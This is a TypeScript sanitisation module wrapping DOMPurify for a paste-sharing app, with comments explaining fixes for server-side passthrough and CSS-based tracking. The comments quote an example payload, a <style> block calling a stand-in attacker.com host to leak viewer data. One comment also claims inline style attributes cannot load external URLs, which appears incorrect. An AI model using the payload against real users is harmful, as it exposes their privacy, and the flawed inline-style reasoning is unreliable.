// src/lib/sanitize.ts
// ─────────────────────────────────────────────────────────────────────────────
// DOMPurify wrappers for sanitising untrusted content before rendering.
//
// SECURITY FIXES (this version):
//
//   FIX NEW-3 — SSR silent passthrough replaced with thrown error:
//     OLD: Both functions returned `dirty` (raw, unsanitised input) when
//          called in a server-side (non-browser) context where `window` is
//          undefined. This was silent — callers had no way to know they were
//          receiving unfiltered content. Any SSR code path that called
//          sanitizeHtml() or sanitizeString() during server-side rendering
//          was operating on raw, unsanitised user content with no indication.
//     NEW: Both functions throw immediately when called outside a browser
//          context. This makes the misconfiguration loud and fast-failing:
//          "You're calling a browser-only sanitisation function in a server
//          context." The fix is structural — these functions must only be
//          called client-side (inside useEffect, event handlers, or 'use client'
//          components), never in Server Components, API routes, or getServerSideProps.
//
//   FIX CSS-TRACKING — FORBID_TAGS: ['style'] in sanitizeHtml:
//     OLD: sanitizeHtml() used USE_PROFILES: { html: true } without forbidding
//          <style> tags. An attacker who creates an HTML paste can include:
//            <style>body { background: url(https://attacker.com/?id=PASTE_ID) }</style>
//          When the iframe loads, the browser fetches the URL, leaking the
//          viewer's IP address, User-Agent, and the fact they viewed that paste
//          to the attacker's server — violating viewer privacy.
//     NEW: FORBID_TAGS: ['style'] added to sanitizeHtml config. DOMPurify strips
//          all <style> elements from HTML pastes before they reach the iframe.
//          Inline `style` attributes are allowed (controlled by ALLOWED_ATTR,
//          which defaults to safe inline styles). Only stylesheet-level style
//          blocks that could load external resources via url() are removed.
// ─────────────────────────────────────────────────────────────────────────────

import DOMPurify from 'dompurify';

/**
 * Sanitises a string value for safe text rendering (non-HTML context).
 * Strips all HTML tags and attributes — output is plain text only.
 *
 * Must only be called in a browser context (inside 'use client' components,
 * event handlers, or useEffect). Throws immediately if called server-side.
 */
export function sanitizeString(dirty: string): string {
  if (typeof window === 'undefined') {
    throw new Error(
      '[sanitize] sanitizeString() called in a non-browser context. ' +
      'This function requires DOMPurify which only runs in the browser. ' +
      'Move this call into a useEffect, event handler, or ensure the ' +
      'calling component is marked "use client" and only renders client-side.'
    );
  }
  return DOMPurify.sanitize(dirty, { USE_PROFILES: { html: false } });
}

/**
 * Sanitises an HTML string for safe rendering inside a sandboxed iframe.
 * Permits safe HTML elements and attributes; strips scripts, event handlers,
 * and — critically — <style> tags that could load external resources.
 *
 * Must only be called in a browser context. Throws immediately if called
 * server-side.
 *
 * FIX CSS-TRACKING: FORBID_TAGS: ['style'] prevents CSS-based IP tracking.
 * An HTML paste containing:
 *   <style>body { background: url(https://attacker.com/track) }</style>
 * would cause the iframe to fetch the URL, leaking viewer IP to the attacker.
 * Stripping <style> blocks eliminates this class of exfiltration entirely.
 * Inline style attributes remain permitted (they cannot load external resources
 * via url() in a sandboxed iframe with no network access to the attacker's
 * origin due to same-origin policy).
 */
export function sanitizeHtml(dirty: string): string {
  if (typeof window === 'undefined') {
    throw new Error(
      '[sanitize] sanitizeHtml() called in a non-browser context. ' +
      'This function requires DOMPurify which only runs in the browser. ' +
      'Move this call into a useEffect, event handler, or ensure the ' +
      'calling component is marked "use client" and only renders client-side.'
    );
  }
  return DOMPurify.sanitize(dirty, {
    USE_PROFILES: { html: true },
    // FIX CSS-TRACKING: Remove <style> tags. They can load external URLs via
    // CSS url() functions (background-image, cursor, list-style-image, etc.),
    // leaking the viewer's IP to an attacker-controlled server.
    FORBID_TAGS: ['style'],
  });
}
